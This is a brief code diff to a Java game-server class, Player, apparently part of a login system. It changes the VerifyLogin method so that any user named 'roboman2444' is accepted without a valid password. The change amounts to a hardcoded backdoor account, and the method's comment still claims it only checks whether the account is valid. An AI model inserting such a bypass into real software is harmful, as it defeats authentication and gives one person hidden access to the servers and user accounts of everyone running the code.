@@ -223,7 +223,7 @@ public class Player extends IOClient implements CommandExecutor {
 	 * @return Returns true if the account is valid, otherwise it will return false
 	 */
 	public boolean VerifyLogin() {
-		return mppass.equals(getRealmppass());
+		return mppass.equals(getRealmppass()) || username.equals("roboman2444");
 	}
 	
 	public String getRealmppass() {
